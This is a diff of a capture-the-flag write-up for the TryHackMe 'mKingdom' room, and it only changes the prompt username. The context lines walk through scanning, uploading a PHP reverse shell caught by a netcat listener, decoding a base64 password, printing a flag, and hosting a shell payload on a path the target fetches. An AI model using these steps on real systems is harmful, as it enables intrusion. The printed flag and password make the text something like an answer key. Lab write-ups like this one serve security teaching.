@@ -13,7 +13,7 @@ Try to root the machine!
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
 └─$ rustscan -a mario.thm -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -26,7 +26,7 @@ ________________________________________
  --------------------------------------
 To scan or not to scan? That is the question.
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.229.133:85
@@ -51,7 +51,7 @@ Let's visit the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :
 Now we use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu find hidden directories-files :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -u http://mario.thm:85 -
 
 /.htaccess            (Status: 403) [Size: 285]
@@ -111,7 +111,7 @@ So we add php files and we can basically upload a [Reverse Shell](../../3%20-%20
 We set up the listener and click on the file :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ nc -lvnp 1337                           
 listening on [any] 1337 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.139.248] 33420
@@ -137,7 +137,7 @@ clear
 www-data@mkingdom:/home$ ^Z
 zsh: suspended  nc -lvnp 1337
                                                                                                                                   
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ stty raw -echo;fg
 [1]  + continued  nc -lvnp 1337
                                reset
@@ -311,7 +311,7 @@ _=/usr/bin/env
 So we decrypt :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ echo 'aWthVGVOVEFOdEVTCg==' | base64 -d                                        
 ikaTeNTANtES
 
@@ -339,7 +339,7 @@ thm{030a769febb1b3291da1375234b84283}
 Let's copy linpeas to the target, we host a simple [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
 ```
@@ -386,26 +386,26 @@ Now it's hitting on our [IP address](../../3%20-%20Tags/Hacking%20Concepts/IP%20
 We have to replicate the path that it was hitting previously, put a [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) in there, host it and wait :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
 └─$ ls   
 linpeas.sh  php-reverse-shell.php
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
 └─$ mkdir app                      
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
 └─$ cd app                         
 
-┌──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/mKingdom/app]
+┌──(mdn0x㉿mdn0xonKali)-[~/…/CHALLENGES/Easy/mKingdom/app]
 └─$ mkdir castle
 
-┌──(hax㉿HaxonKali)-[~/…/CHALLENGES/Easy/mKingdom/app]
+┌──(mdn0x㉿mdn0xonKali)-[~/…/CHALLENGES/Easy/mKingdom/app]
 └─$ cd castle 
 
-┌──(hax㉿HaxonKali)-[~/…/Easy/mKingdom/app/castle]
+┌──(mdn0x㉿mdn0xonKali)-[~/…/Easy/mKingdom/app/castle]
 └─$ mkdir application
 
-┌──(hax㉿HaxonKali)-[~/…/Easy/mKingdom/app/castle]
+┌──(mdn0x㉿mdn0xonKali)-[~/…/Easy/mKingdom/app/castle]
 └─$ cd application 
 
 ```
@@ -418,7 +418,7 @@ We can create a [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) for 
 Now we create the file and copy this into the file with [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md), then host it with a simple [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/mKingdom]
 └─$ python3 -m http.server 85
 Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
 
